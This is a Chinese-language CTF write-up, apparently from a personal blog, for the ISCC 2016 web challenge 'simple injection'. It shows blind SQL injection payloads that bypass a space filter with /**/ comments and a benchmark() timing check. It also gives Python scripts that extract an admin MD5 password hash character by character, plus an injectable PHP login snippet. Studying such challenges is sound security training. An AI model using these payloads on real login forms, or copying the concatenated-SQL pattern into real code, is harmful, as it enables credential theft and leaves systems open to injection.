---
layout:     post
title:      "simple injection"
subtitle:   "iscc2016-web"
date:       2016-05-21 22:00:00
author:     "ssst0n3"
header-img: "img/post-bg-01.jpg"
---

# simple injection

`score: 350`  `Type: web, sql`

## 题目

### 题目信息

小明老板经常嫌弃小明太懒了，这次老板给了小明一个简单的问题，解决不了就要被炒鱿鱼喽~

### 描述

给了一个网站，点击进去之后发现一个登录框

### 知识点

sql盲注, [mysql字符串函数](http://blog.csdn.net/kobejayandy/article/details/23137267)

## 题解

#### 测试

* sql盲注最重要的就是猜解后台程序，我们猜测后台大概有两种可能
 + `$sql = "select * from admin where username = '".$username."' and password = '"."$password'";`
 +  `$sql = "select password from admin where username = '".$username."'";`

#### 猜解后台sql语句

随手输入

`admin,admin发现返回密码错误;`

`user,admin返回用户名错误`

猜测后台程序中sql语句应该类似于

```
$username = $escape($_POST["username"])
$sql = "select password from admin where username = '".$username."'";
```

因此，注入点只能存在于username，下面对注入点的存在性进行验证

#### 确认注入点是否存在

现在已有的信息为：username可能存在注入点,后台中存在admin用户，不存在user用户

```
username=user' or '1'='1  ===> 密码错误
username=user' union select '1 ===> 期望返回:密码错误, 实际返回500
```

以上输入以及返回信息说明存在注入点,但做了过滤

#### 绕过过滤

对于union，猜测可能过滤了union关键词，可能过滤了别的，考虑以下语句
`username=user'/**/union/**/select/**/'1 ===> 密码错误`

因此可能过滤的是空格

#### 确认数据库相关信息

* 数据库版本

```
username=adm'/**/'in   ===> 密码错误
username=admin'/**/union/**/select/**/benchmark(10000000,encode('hello','mom'));'                                        =>密码错误密码错误  时间延迟
```

以上输入通过字符串连接来判断数据库种类，确定是mysql，并且时间延迟更加确定了注入点存在。类似的判断方法还有很多。

```
//连接字符串
'a'+'b' = 'ab'  ===> SQL Server
'a'||'b' = 'ab' ===> Oracle,PostgreSQL
```

对于mysql版本没有研究，可以跑一下sqlmap

* 后台表名及数据

```
username='/**/or/**/exists/**/(select/**/1);'  ===>密码错误===>确定可以通过这种方式猜解数据

username=admin'/**/order/**/by/**/1;'  ===>密码错误
username=admin'/**/order/**/by/**/2;'  ===>500
===>确认sql语句只选择了一列，确认之前猜解的语句正确

username='/**/or/**/exists/**/(select/**/username,password/**/from/**/admin);'  ===>密码错误===>确认存在admin表，存在username,password字段

```

* 确认密码信息

`user'/**/union/**/select/**/password/**/from/**/admin/**/where/**/length(password)=32;' ===> 密码错误 ===> 确认密码长度为32位`

以上语句确认password字段为32位，猜测通过md5存储

`user'/**/union/**/select/**/password/**/from/**/admin/**/where/**/substring(password1,1)='f ===> 密码错误 ===> 确认密码第一位为f`

下面写一个脚本，遍历0-9a-f 32次得到password,发现是md5，拿去解密得到flag

#### py

```
# -*- coding: utf-8 -*-
import requests

url = "http://101.200.145.44/web6/auth.php"
strBox = '0123456789abcdef'
password = []
for index in range (1,33):
    print index,
    for i in strBox:
        username = "admin'/**/and/**/substring(password,"+str(index)+",1)='"+i
        data = {'username':username,'password':'admin'}
        r = requests.post(url,data=data)
        if r.text.find(u'ï»¿å¯ç éè') != -1:
            print i
            password.append(i)
            break
print ''.join(password)
```

#### 后台语句

最后猜解的后台语句如下，并且mysql应该设置了用户权限仅拥有select权限，或者每次访问都重置数据库

```
auth.php

$username = $_POST["username"];
$username = str_replace(' ', '', $username);
$password = $_POST["password"];
$sql = "select password from admin where username = '".$username."'";
$result = mysql_query($sql);
$rowcount = mysql_num_rows($result);
if $rowcount == 0{
  echo '用户名错误';
}else{
  while ($rowcount--){
    if ($username = 'admin' and $password = $result[$row]){
      echo '密码错误'
    }
  }
}
```

#### 方法改进

我们采用的方法的核心语句为

`select password from admin where username = 'admin' and substring(password, index, 1) = '0-9a-f'; `

即通过循环遍历0-9a-f得到答案，但是这样最坏的情况需要遍历16次才能得知，这里给出两种优化方案

* 优化二分搜索法

`select password from admin where username = 'admin' and substring(password, index, 1) in ('0','1','2','3'...)`

即通过二分搜索自己预设的字母表

* 逐位法

`select password from admin where username = 'admin' and ascii(substring(password, index, 1) & 128 = 128`

即通过比对密码每一位的二进制bit

##### py
```
# -*- coding: utf-8 -*-
import requests

def method1():
    url = "http://101.200.145.44/web6/auth.php"
    strBox = '0123456789abcdef'
    password = []
    for index in range (1,33):
        print index,
        for i in strBox:
            username = "admin'/**/and/**/substring(password,"+str(index)+",1)='"+i
            data = {'username':username,'password':'admin'}
            r = requests.post(url,data=data)
            if r.text.find(u'ï»¿å¯ç éè') != -1:
                print i
                password.append(i)
                break
    print ''.join(password)

def method2():
    url = "http://101.200.145.44/web6/auth.php"
    strBox = "'0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f'"
    password = []
    for index in range (1,33):
        print index,':',
        startPos = 0
        endPos = len(strBox)//2
        while endPos - startPos >= 3 :
            username = "admin'/**/and/**/substring(password,"+str(index)+",1)/**/in/**/("+strBox[startPos:endPos]+");'"
            data = {'username':username,'password':'admin'}
            r = requests.post(url,data=data)
            if r.text.find(u'ï»¿å¯ç éè') != -1:
                endPos = startPos + (endPos-startPos)//2
            else:
                tmp = endPos - startPos
                startPos = endPos + 1
                endPos = startPos + tmp

        print strBox[startPos+1]
        password.append(strBox[startPos+1])

    print ''.join(password)


def method3():
    url = "http://101.200.145.44/web6/auth.php"
##    strBox = "'0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f'"
    password = []
    for index in range (1,33):
        print index,':',
        bit = []

        for i in range(8):
            username = "admin'/**/and/**/ascii(substring(password,"+str(index)+",1))/**/&/**/("+str(pow(2,7-i))+");'"
            data = {'username':username,'password':'admin'}
            r = requests.post(url,data=data)
            if r.text.find(u'ï»¿å¯ç éè') != -1:
                bit.append('1')
            else:
                bit.append('0')

        ch = chr(int(''.join(bit),2))
        print ch
        password.append(ch)

    print ''.join(password)


if __name__ == '__main__':
    import time
    time1_1 = time.time()
    method1()
    time1_2 = time.time()
    print time1_2-time1_1
    time2_1 = time.time()
    method2()
    time2_2 = time.time()
    print time2_2-time2_1
    time3_1 = time.time()
    method3()
    time3_2 = time.time()
    print time3_2-time3_1
```

最终本题，第二种方案速度最快
